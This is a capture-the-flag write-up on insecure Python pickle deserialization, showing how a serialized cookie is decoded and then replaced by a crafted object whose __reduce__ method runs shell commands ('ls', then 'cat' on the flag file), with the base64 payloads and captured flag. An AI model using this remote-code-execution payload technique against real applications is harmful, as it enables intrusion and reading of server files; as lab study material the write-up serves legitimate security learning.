## we have this site with this message 
![Screenshot 2023-08-08 at 22-33-24 insecure deserialization](https://github.com/kiro6/writeups-ctfs/assets/57776872/8e5721b2-45e6-4395-b8ed-0a32509f9333)

## using burp , it seems to be serialized object 
![Screenshot_20230808_223449](https://github.com/kiro6/writeups-ctfs/assets/57776872/eb081bb0-591e-44b2-b94d-aa9ee8e4e9c3)

## this serialzed object tells us , there is an object named serum using class named anti_pickle_serum `serum = anti_pickle_serum()` 

## i made a script to deserialized the object , to check if i am right
```python
import pickle
import pickletools
from base64 import b64decode


class anti_pickle_serum(object):
    def __init__(self) -> None:
        pass


data = b'KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu'

decoded_data = b64decode(data)

opt_data = pickletools.optimize(decoded_data)
pickletools.dis(opt_data)

obj = pickle.loads(opt_data)
print(obj)
```
- output
```
python3 ser.py 
    0: (    MARK
    1: d        DICT       (MARK at 0)
    2: S    STRING     'serum'
   11: c    GLOBAL     'copy_reg _reconstructor'
   36: (    MARK
   37: c        GLOBAL     '__main__ anti_pickle_serum'
   65: c        GLOBAL     '__builtin__ object'
   85: N        NONE
   86: t        TUPLE      (MARK at 36)
   87: R    REDUCE
   88: s    SETITEM
   89: .    STOP
highest protocol among opcodes = 0
{'serum': <__main__.anti_pickle_serum object at 0x7f240a48b9a0>}
```

## then i made this script to expolit 
```python
import pickle
import pickletools
from base64 import b64encode
import subprocess


class anti_pickle_serum(object):
    def __reduce__(self):
        cmd=['ls']
        return subprocess.check_output , (cmd,)


exploit_obj = anti_pickle_serum()

exploit_obj_data = pickle.dumps({"serum":exploit_obj} , protocol=0)

optmized_obj=pickletools.optimize(exploit_obj_data)
pickletools.dis(optmized_obj)

payload = b64encode(exploit_obj_data)

print(payload)

```
- but the output it did not work , because the challenge using python2 and i was runing script in python3 , so using online compiler for python2 the output :
```
KGRwMApTJ3NlcnVtJwpwMQpjc3VicHJvY2VzcwpjaGVja19vdXRwdXQKcDIKKChscDMKUydscycKcDQKYXRwNQpScDYKcy4=
```
![Screenshot_20230808_225830](https://github.com/kiro6/writeups-ctfs/assets/57776872/8c77d69a-d4c7-4535-8703-31e19cc4bae2)


## we can see the flag file name , change the code to `cmd=['cat','flag_wIp1b']`
```
KGRwMApTJ3NlcnVtJwpwMQpjc3VicHJvY2VzcwpjaGVja19vdXRwdXQKcDIKKChscDMKUydjYXQnCnA0CmFTJ2ZsYWdfd0lwMWInCnA1CmF0cDYKUnA3CnMu
```
![Screenshot_20230808_230040](https://github.com/kiro6/writeups-ctfs/assets/57776872/ef73819f-9935-465d-9c15-15655caf7239)


```
HTB{g00d_j0b_m0rty...n0w_I_h4v3_to_g0_to_f4m1ly_th3r4py..}
```
